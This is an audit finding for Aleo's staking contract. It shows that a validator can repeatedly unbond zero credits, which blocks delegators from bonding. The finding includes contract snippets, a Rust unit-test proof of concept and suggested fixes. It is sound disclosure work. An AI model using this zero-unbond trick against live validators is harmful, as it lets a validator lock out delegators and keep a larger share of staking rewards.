Special Felt Alligator

Medium

# Validator can block existing delegators from increasing their delegations and new delegators to bond at no cost

## Summary
A validator can block delegators already bonded to the validator from increasing their delegations and new delegators from bonding to the delegator at no cost, because `unbond_public` allows unbonding of 0 credits
## Vulnerability Detail
When a validator is in the committee, the self bond amount is > 100 credits and the total delegated amount is > 10M. The validator can use `unbond_public` to unbond a certain amount of credits or to force unbond a delegator. However, this function allows the validator to set the `amount` to unbond to `0` , which means that the validator can initialize the `unbond[]` mapping with 0 credits. 
```java
@=> // There is no previous check for r2, hence it can be zero
        /* Unbonding */

        // Retrieve or initialize the unbonding state.
        get.or_use unbonding[r5.validator] r4 into r38;
        // Increment the unbond amount.
        // Note: If the addition overflows, reject the transition.
        add r38.microcredits r2 into r39;
        // Set the updated unbond state.
        cast r39 r3 into r40 as unbond_state;
        // Store the new unbonding state.
        set r40 into unbonding[r5.validator];
```
When the `unbond[]` state is active for the validator, no new delegations can be made to it because of the following check in [`bond_public`](https://github.com/sherlock-audit/2024-05-aleo/blob/55b2e4a02f27602a54c11f964f6f610fee6f4ab8/snarkVM/synthesizer/program/src/resources/credits.aleo#L391-L394)
```java
    // Check if the validator exists in the unbonding state.
    contains unbonding[r1] into r20;
    // Ensure the validator currently is not unbonding.
    assert.eq r20 false;
```
This means that no new delegator will be able to bond to the validator, and existing delegators will be denied from increasing their bonds (in order to receive more staking awards).

After 360 blocks, the `unbond[]` state of the validator can be removed by calling `claim_unbond_public`
```java
finalize claim_unbond_public:
    // Input the staker's address.
    input r0 as address.public;

    // Get the unbond state for the address, or fail if it does not exist.
    get unbonding[r0] into r1;
    // Determine if unbonding is complete.
    gte block.height r1.height into r2;
    // Enforce the unbonding is complete.
    assert.eq r2 true;

    /* Withdraw */

    // Get the withdrawal address for the address.
    get withdraw[r0] into r3;

    /* Account */

    // Add the unbonded amount to the withdrawal address public balance.
    // Increments `account[r3]` by `r1.microcredits`.
    // If `account[r3]` does not exist, 0u64 is used.
    // If `account[r3] + r1.microcredits` overflows, `claim_unbond_public` is reverted.
    get.or_use account[r3] 0u64 into r4;
    add r1.microcredits r4 into r5;
    set r5 into account[r3];

    /* Unbonding */

    // Remove the unbond state for the staker.
@=>    remove unbonding[r0];

    // Check if the staker is still bonded.
    contains bonded[r0] into r6;
    // Ends the `claim_unbond_public` logic.
    branch.eq r6 true to end;

    /* Withdraw */

    // If the caller is no longer bonded, remove the withdrawal address.
    remove withdraw[r0];

    // The terminus.
    position end;
```
However, the validator can just repeat the call to `unbond_public` with 0 as input and cause this DoS for the next 360 blocks.
## Impact
DoS.  Existing delegators should be able to increase their delegations as long as the validator is in the committee so that they can increase their staking rewards. 
The benefit that the validator gets from this is that their % share of stake does not fall due to new delegations. Hence, they retain higher staking rewards.

## Coded PoC
```rust
#[test]
fn test_unbond_delegator_as_validator() {
    let rng = &mut TestRng::default();

    // Construct the process.
    let process = Process::<CurrentNetwork>::load().unwrap();

    // Initialize a new finalize store.
    let finalize_store = FinalizeStore::<CurrentNetwork, FinalizeMemory<_>>::open(None).unwrap();

    // Initialize the validators and delegators.
    let (validators, delegators) = initialize_stakers(&finalize_store, 2, 1, rng).unwrap();
    let mut validators = validators.into_iter();
    let (validator_private_key_1, (validator_address_1, _, withdrawal_private_key_1, withdrawal_address_1)) =
        validators.next().unwrap();
    let (delegator_private_key, (delegator_address, _)) = delegators.first().unwrap();

    // Bond the validator
    let validator_amount = MIN_VALIDATOR_STAKE;
    bond_validator(
        &process,
        &finalize_store,
        &validator_private_key_1,
        &withdrawal_address_1,
        validator_amount,
        TEST_COMMISSION,
        rng,
    )
    .unwrap();

    // Bond the delegator.
    let delegator_amount = MIN_DELEGATOR_STAKE;
    bond_public(
        &process,
        &finalize_store,
        delegator_private_key,
        &validator_address_1,
        delegator_address,
        delegator_amount,
        rng,
    )
    .unwrap();

    let block_height = rng.gen_range(1..100);

    // validator self-unbonds 0 credits, to set the unbond state
    unbond_public(&process, &finalize_store, &withdrawal_private_key_1, &validator_address_1, 0u64, block_height, rng)
        .unwrap();

    // existing delegator cannot bond to the validator, as unbond state exists
    assert!(bond_public(
        &process,
        &finalize_store,
        delegator_private_key,
        &validator_address_1,
        delegator_address,
        delegator_amount,
        rng,
    )
    .is_err());
}
```

To run the test :
1. Copy the above code into `test_credits.rs`
2. Click on `Run Test`
## Code Snippet

## Tool used

Manual Review

## Recommendation
Let the existing delegators increase their delegations even when the validator is in the unbonding state, as long as the validator is in the committee.
Alternatively, check whether the `amount` in `unbond_public` call is at least 1 credit if the validator is self-unbonding